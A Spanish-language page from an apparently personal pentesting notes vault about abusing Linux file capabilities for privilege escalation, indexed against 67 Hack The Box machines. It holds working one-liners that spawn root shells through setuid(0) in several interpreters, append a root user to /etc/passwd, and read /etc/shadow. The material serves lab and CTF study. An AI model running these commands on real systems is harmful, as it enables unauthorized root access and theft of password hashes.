# Técnica: capabilities

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**67 máquina(s)** mencionan esta técnica.

Alias buscados: `getcap`, `setcap`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<IP>` · `/usr/bin/<binario>`

### Enumerar

```bash
getcap -r / 2>/dev/null
getcap -r / 2>/dev/null | grep -E 'ep|Cap'
```

### Vectores por capacidad

| Capacidad | Cómo se explota |
| --- | --- |
| `cap_setuid+ep` | Ejecutar setuid(0) directo |
| `cap_setgid+ep` | Ídem con grupo |
| `cap_dac_read_search` | Leer archivos que no te corresponden (`/etc/shadow`) |
| `cap_dac_override` | **Escribir** archivos arbitrarios → `/etc/passwd` |
| `cap_sys_admin` | Montar filesystems, manipular namespaces |
| `cap_sys_ptrace` | Inyectar en procesos ajenos |
| `cap_net_raw` | Sniffing |

### `cap_setuid+ep` — el más directo

```bash
# Python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# Perl
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# Ruby
/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# Node
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh",{stdio:[0,1,2]})'

# php
/usr/bin/php -r 'posix_setuid(0); system("/bin/bash");'
```

### `cap_dac_override+ep` — escribir lo que quieras

```bash
# Agregar un usuario root sin contraseña
openssl passwd -1 -salt xyz 'pwned'
echo 'pwned:$1$xyz$<HASH>:0:0:root:/root:/bin/bash' | /usr/bin/<binario> tee -a /etc/passwd
su pwned
```

### `cap_dac_read_search+ep` — leer lo que quieras

```bash
/usr/bin/<binario> /etc/shadow
```

### Cómo saber si el binario está en GTFOBins

```bash
# Casi todos los binarios con capacidad tienen su truco documentado
# https://gtfobins.github.io/#+capabilities
```

## Referencias

- [[GTFOBins|GTFOBins (espejo local)]] — https://gtfobins.github.io/

---

## Máquinas

- [[htb-skyfall\|Skyfall]] — 34 mención(es) · Linux · Insane
- [[htb-earlyaccess\|EarlyAccess]] — 16 mención(es) · Linux · Hard
- [[htb-scanned\|Scanned]] — 16 mención(es) · Linux · Insane
- [[htb-waldo\|Waldo]] — 12 mención(es) · Linux · Medium
- [[htb-cap\|Cap]] — 10 mención(es) · Linux · Easy
- [[htb-interactive\|htb-interactive]] — 10 mención(es)
- [[htb-jab\|Jab]] — 7 mención(es) · Windows · Medium
- [[htb-chaos\|Chaos]] — 6 mención(es) · Linux · Medium
- [[htb-lightweight\|Lightweight]] — 6 mención(es) · Linux · Medium
- [[htb-retired\|Retired]] — 5 mención(es) · Linux · Medium
- [[htb-analytics\|Analytics]] — 4 mención(es) · Linux · Easy
- [[htb-formulax\|FormulaX]] — 4 mención(es) · Linux · Hard
- [[htb-beep\|Beep]] — 3 mención(es) · Linux · Easy
- [[htb-brainfuck\|Brainfuck]] — 3 mención(es) · Linux · Insane
- [[htb-carpediem\|CarpeDiem]] — 3 mención(es) · Linux · Hard
- [[htb-cybermonday\|CyberMonday]] — 3 mención(es) · Linux · Hard
- [[htb-dyplesher\|Dyplesher]] — 3 mención(es) · Linux · Insane
- [[htb-faculty\|Faculty]] — 3 mención(es) · Linux · Medium
- [[htb-fulcrum\|Fulcrum]] — 3 mención(es) · Linux · Insane
- [[htb-gofer\|Gofer]] — 3 mención(es) · Linux · Hard
- [[htb-hospital\|Hospital]] — 3 mención(es) · Windows · Medium
- [[htb-mailing\|Mailing]] — 3 mención(es) · Windows · Easy
- [[htb-smasher2\|Smasher2]] — 3 mención(es) · Linux · Insane
- [[htb-talkative\|Talkative]] — 3 mención(es) · Linux · Hard
- [[htb-wifinetic\|Wifinetic]] — 3 mención(es) · Linux · Easy
- [[htb-ambassador\|Ambassador]] — 2 mención(es) · Linux · Medium
- [[htb-cctv\|CCTV]] — 2 mención(es) · Linux · Easy
- [[htb-cerberus\|Cerberus]] — 2 mención(es) · Windows · Hard
- [[htb-editor\|Editor]] — 2 mención(es) · Linux · Easy
- [[htb-hackback\|Hackback]] — 2 mención(es) · Windows · Insane
- [[htb-intentions\|Intentions]] — 2 mención(es) · Linux · Hard
- [[htb-rabbit\|Rabbit]] — 2 mención(es) · Windows · Insane
- [[htb-snapped\|Snapped]] — 2 mención(es) · Linux · Hard
- [[htb-sneakymailer\|SneakyMailer]] — 2 mención(es) · Linux · Medium
- [[htb-snoopy\|Snoopy]] — 2 mención(es) · Linux · Hard
- [[htb-static\|Static]] — 2 mención(es) · Linux · Hard
- [[htb-wifinetictwo\|WifineticTwo]] — 2 mención(es) · Linux · Medium
- [[htb-backendtwo\|BackendTwo]] — 1 mención(es) · Linux · Medium
- [[htb-broker\|Broker]] — 1 mención(es) · Linux · Easy
- [[htb-conceal\|Conceal]] — 1 mención(es) · Windows · Hard
- [[htb-cypher\|Cypher]] — 1 mención(es) · Linux · Medium
- [[htb-darkzero\|DarkZero]] — 1 mención(es) · Windows · Hard
- [[htb-devoops\|DevOops]] — 1 mención(es) · Linux · Medium
- [[htb-dropzone\|Dropzone]] — 1 mención(es) · Windows · Hard
- [[htb-ethereal-cor\|Applocker Bypass: COR Profiler]] — 1 mención(es)
- [[htb-forest\|Forest]] — 1 mención(es) · Windows · Easy
- [[htb-ghostlink\|Ghostlink]] — 1 mención(es) · Windows · Hard
- [[htb-giveback\|Giveback]] — 1 mención(es) · Linux · Medium
- [[htb-kotarak\|Kotarak]] — 1 mención(es) · Linux · Hard
- [[htb-magicgardens\|MagicGardens]] — 1 mención(es) · Linux · Insane
- [[htb-monitors\|Monitors]] — 1 mención(es) · Linux · Hard
- [[htb-monitorsfour\|MonitorsFour]] — 1 mención(es) · Windows · Easy
- [[htb-nunchucks\|Nunchucks]] — 1 mención(es) · Linux · Easy
- [[htb-oz\|Oz]] — 1 mención(es) · Linux · Hard
- [[htb-pikatwoo\|PikaTwoo]] — 1 mención(es) · Linux · Insane
- [[htb-pressed\|Pressed]] — 1 mención(es) · Linux · Hard
- [[htb-pterodactyl\|Pterodactyl]] — 1 mención(es) · Linux · Medium
- [[htb-signed\|Signed]] — 1 mención(es) · Windows · Medium
- [[htb-silo\|Silo]] — 1 mención(es) · Windows · Medium
- [[htb-soccer\|Soccer]] — 1 mención(es) · Linux · Easy
- [[htb-stacked\|Stacked]] — 1 mención(es) · Linux · Insane
- [[htb-store\|Store]] — 1 mención(es) · Linux · Hard
- [[htb-strutted\|Strutted]] — 1 mención(es) · Linux · Medium
- [[htb-thefrizz\|TheFrizz]] — 1 mención(es) · Windows · Medium
- [[htb-tombwatcher\|TombWatcher]] — 1 mención(es) · Windows · Medium
- [[htb-trickster\|Trickster]] — 1 mención(es) · Linux · Medium
- [[htb-yummy\|Yummy]] — 1 mención(es) · Linux · Hard

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'capabilities' -v
python3 _sistema/herramientas/buscar.py 'capabilities' -v --oscp
```
